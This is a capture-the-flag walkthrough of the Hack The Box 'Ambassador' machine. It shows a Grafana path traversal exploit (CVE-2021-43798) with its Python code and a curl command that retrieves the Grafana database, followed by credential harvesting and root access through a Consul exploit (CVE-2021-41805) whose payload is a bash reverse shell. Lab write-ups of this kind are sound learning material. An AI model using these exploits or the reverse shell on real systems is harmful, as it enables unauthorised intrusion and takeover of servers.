## Introduction
Hi! Today we will hack Ambassador machine form hack the box it is rated as medium but in reality it is more between easy and medium, we will get foothold with path traversal vulnerability in Grafana by obtaining password for MySQL database and here we will get password for ssh, for privlige escalation we will exploit RCE on consul.
## Discovery
First we check for connection while confirming it is linux based system (ttl=63)

![image](https://github.com/user-attachments/assets/d576f853-c7fe-4e84-b11b-58422fea3c7d)

Everything works so its time for nmap scan:
```
nmap -sV -sC 10.10.11.183
```
-sV for sercive version                        
-sC for deafult scripts

output is pretty messy:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-15 03:02 EDT                                                                                                    
Nmap scan report for 10.10.11.183                                                                                                                                     
Host is up (0.22s latency).                                                                                                                                           
Not shown: 996 closed tcp ports (conn-refused)                                                                                                                        
PORT     STATE SERVICE VERSION                                                                                                                                        
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)                                                                                   
| ssh-hostkey:                                                                                                                                                        
|   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)                                                                                                        
|   256 80:a4:c5:2e:9a:b1:ec:da:27:64:39:a4:08:97:3b:ef (ECDSA)                                                                                                       
|_  256 f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 (ED25519)                                                                                                     
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))                                                                                                                 
|_http-title: Ambassador Development Server                                                                                                                           
|_http-server-header: Apache/2.4.41 (Ubuntu)                                                                                                                          
|_http-generator: Hugo 0.94.2                                                                                                                                         
3000/tcp open  ppp?                                                                                                                                                   
| fingerprint-strings:                                                                                                                                                
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:                                                                    
|     HTTP/1.1 400 Bad Request                                                                                                                                        
|     Content-Type: text/plain; charset=utf-8                                                                                                                         
|     Connection: close                                                                                                                                               
|     Request                                                                                                                                                         
|   GetRequest:                                                                                                                                                       
|     HTTP/1.0 302 Found                                                                                                                                              
|     Cache-Control: no-cache                                                                                                                                         
|     Content-Type: text/html; charset=utf-8                                                                                                                          
|     Expires: -1                                                                                                                                                     
|     Expires: -1                                                                                                                                                     
|     Location: /login                                                                                                                                                
|     Pragma: no-cache                                                                                                                                                
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax                                                                                                     
|     X-Content-Type-Options: nosniff                                                                                                                                 
|     X-Frame-Options: deny                                                                                                                                           
|     X-Xss-Protection: 1; mode=block                                                                                                                                 
|     Date: Tue, 15 Oct 2024 07:03:12 GMT                                                                                                                             
|     Content-Length: 29                                                                                                                                              
|     href="/login">Found</a>.                                                                                                                                        
|   HTTPOptions:                                                                                                                                                      
|     HTTP/1.0 302 Found                                                                                                                                              
|     Cache-Control: no-cache                                                                                                                                         
|     Expires: -1                                                                                                                                                     
|     Location: /login                                                                                                                                                
|     Pragma: no-cache                                                                                                                                                
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax                                                                                                     
|     X-Content-Type-Options: nosniff                                                                                                                                 
|     X-Frame-Options: deny                                                                                                                                           
|     X-Xss-Protection: 1; mode=block                                                                                                                                 
|     Date: Tue, 15 Oct 2024 07:03:19 GMT                                                                                                                             
|_    Content-Length: 0                                                                                                                                               
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2                                                                                                                  
| mysql-info:                                                                                                                                                         
|   Protocol: 10                                                                                                                                                      
|   Version: 8.0.30-0ubuntu0.20.04.2                                                                                                                                  
|   Thread ID: 10                                                                                                                                                     
|   Capabilities flags: 65535                                                                                                                                         
|   Some Capabilities: LongPassword, SwitchToSSLAfterHandshake, Support41Auth, SupportsCompression, Speaks41ProtocolOld, InteractiveClient, SupportsLoadDataLocal, Ign
oreSpaceBeforeParenthesis, IgnoreSigpipes, LongColumnFlag, ConnectWithDatabase, Speaks41ProtocolNew, SupportsTransactions, DontAllowDatabaseTableColumn, FoundRows, OD
BCClient, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins                                                                                     
|   Status: Autocommit                                                                                                                                                
|   Salt: *}2so{_h\x02k\x01`\x1An\x1EZ#3\x1D*                                                                                                                         
|_  Auth Plugin Name: caching_sha2_password                                                                                                                           
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

SF-Port3000-TCP:V=7.94SVN%I=7%D=10/15%Time=670E13B0%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Co
SF:ntrol:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nE
SF:xpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cook
SF:ie:\x20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Co
SF:ntent-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Pro
SF:tection:\x201;\x20mode=block\r\nDate:\x20Tue,\x2015\x20Oct\x202024\x200
SF:7:03:12\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Fo
SF:und</a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\
SF:nCache-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\
SF:nPragma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20H
SF:ttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Fra
SF:me-Options:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x
SF:20Tue,\x2015\x20Oct\x202024\x2007:03:19\x20GMT\r\nContent-Length:\x200\
SF:r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConte
SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\
SF:n400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection
SF::\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20cha
SF:rset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLS
SF:SessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten
SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n
SF:400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 148.04 seconds
```
By analyzing scan we can see that there are four services open:
- ssh (22)
- http (80)
- ppp? (3000)
- MySQL (3306)
## Foothold
We will start with http:

![image](https://github.com/user-attachments/assets/55ec0b6c-b82c-4747-899e-fce02fc75128)

There is simple website running, i am looking for any input windows for potential sql injection, there is link to another page(read more):

![image](https://github.com/user-attachments/assets/1d5b8068-8a8d-4d38-9a26-526c86dd5c79)

On this page there is also nothing happening, but we got interesting piece of information that there is ssh user called "developer", and DevOps is supposed to give him password.
I tried to Enumerate subdomains, directories and files but found nothing, so i thought it is time to move for another service i choose ppp? over port 3000 since it seemed interesting becouse nmap could not tell what service it is.

![image](https://github.com/user-attachments/assets/ec1eb6eb-e77b-4cdc-b27f-7395c678ccfd)

Deafult credentials for Grafana admin dont work: admin, admin. So only one thing left there beside testing input windows password and login, is to check version (usually when we see common web app we can trust its login page to be secure).
I found CVE-2021-43798 for Grafana, it affects versions from 8.0.-beta1 to 8.3.0, we have 8.2.0 so it should work. This CVE is simple directory traversal vulnerability, in this github:        
https://github.com/jas502n/Grafana-CVE-2021-43798                
I found this path for database password: /var/lib/grafana/grafana.db          
In this exploit-db page i found exploit:            
https://www.exploit-db.com/exploits/50581          
```
def exploit(args):
    s = requests.Session()
    headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.' }

    while True:
        file_to_read = input('Read file > ')

        try:
            url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read
            req = requests.Request(method='GET', url=url, headers=headers)
            prep = req.prepare()
            prep.url = url
            r = s.send(prep, verify=False, timeout=3)

            if 'Plugin file not found' in r.text:
                print('[-] File not found\n')
            else:
                if r.status_code == 200:
                    print(r.text)
                else:
                    print('[-] Something went wrong.')
                    return
        except requests.exceptions.ConnectTimeout:
            print('[-] Request timed out. Please check your host settings.\n')
            return
        except Exception:
            pass
```
By analyzing code we can tell that it have list of plugins, it creates url request by adding to ip/domain, /public/plugins/ and then adding plugin from list, after that path traversal string and file to read.     
We can recreate it manually (grabbing first plugin from the list "alertlist"), path as is flag becouse we dont wand curl to mess with our path:
```
curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../../../../../../var/lib/grafana/grafana.db --output test.txt
```
And it worked!

![image](https://github.com/user-attachments/assets/3f4a4216-3c2c-446a-8c14-0b9e6fa77f45)

(Any plugin from list work and also we dont need that long string of "/../")
We obtained database in test.txt file, now we need to open it, since it is SQL database i will open it with sqlite3:

![image](https://github.com/user-attachments/assets/efd4d752-4be5-4037-9bad-b5ba3dabd685)

I roamed a bit around tables and found: data_source containing password: ```dontStandSoCloseToMe63221!```, i tried this password for ssh but it didnt work so we are left with only one option MySQL password:

![image](https://github.com/user-attachments/assets/7e8a728f-eab7-460c-86e5-cca971a608a4)

There is interesting database called whackywidget:

![image](https://github.com/user-attachments/assets/dc6d114f-989c-4636-b9b8-79dd7ae6bb79)

We got password that looks like it is encoded in base64 so i decoded it:

![image](https://github.com/user-attachments/assets/76587848-de3d-498c-b8f4-69993a84448e)

Tried that password in ssh and it worked

![image](https://github.com/user-attachments/assets/f81b8fc4-adfe-471d-9b3c-9e4865ae556e)

## Privlige escalation
In this section i was roaming around system and found interesting content in /opt/my-app directory, afret i listed all content there was .git which indicates that it is git repository and we can see logs but first lets check rest of files in this repo:

![image](https://github.com/user-attachments/assets/834591ac-258b-4252-beb6-ec9aafedd60e)

I tried this command:
```
consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
```
And results are shown above, i dont have permisions. Lets inspect git logs:

![image](https://github.com/user-attachments/assets/67665526-bd96-4eea-b733-cd6f730f7994)

We found tocken so lets try this tocken:

![image](https://github.com/user-attachments/assets/e02a655f-116c-4ad2-b563-bef30b14ba62)

It works! Now i looked for any exploits that can take advantage of it and found this:                                              
https://github.com/blackm4c/CVE-2021-41805                         
Lets try this exploit:                          

![image](https://github.com/user-attachments/assets/a337c20f-cd41-4117-b4a2-516517150d92)

![image](https://github.com/user-attachments/assets/2a9e2f8b-fbba-4eb0-88f4-84832a05d138)

It worked! We succesfuly got root access to this box.                          
## Explenation of exploit                  
This exploit is crafting a fake service with malicious health check, this health check executes payload with reverse shell as root. Here is breakdown of code:                 
### Taking user input:
```
rhost = input("\n[+] Enter the target: ")
rport = input("\n[+] Enter the listener port: ")
lhost = input("\n[+] Enter the listener IP: ")
lport = input("\n[+] Enter the listener port: ")
acl_token = input("\n[+] Enter the ACL token: ")
```
### Crafting request:
```
target = f"http://{rhost}:{rport}/v1/agent/service/register"
headers = {"X-Consul-Token": acl_token}
```
### Payload(reverse shell):
```
json = {
    "Address": "127.0.0.1",
    "check": {
        "Args": ["/bin/bash", "-c", f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"],
        "interval": "10s",
        "Timeout": "864000s",
    },
    "ID": "test",
    "Name": "test",
    "Port": 80
}
```
It runs every 10 seconds, convenient when shell is dropped
### Sending exploit:
```
requests.put(target, headers=headers, json=json)
print("\n[+] Request sent successfully, check your listener......\n")
```
## Conclusion
This was interesting, user was easy but root took me some time, i learned how Consul works and how to exploit it to escalate privleges. Hope you also learned something new, have good day and good luck on your next challenges!
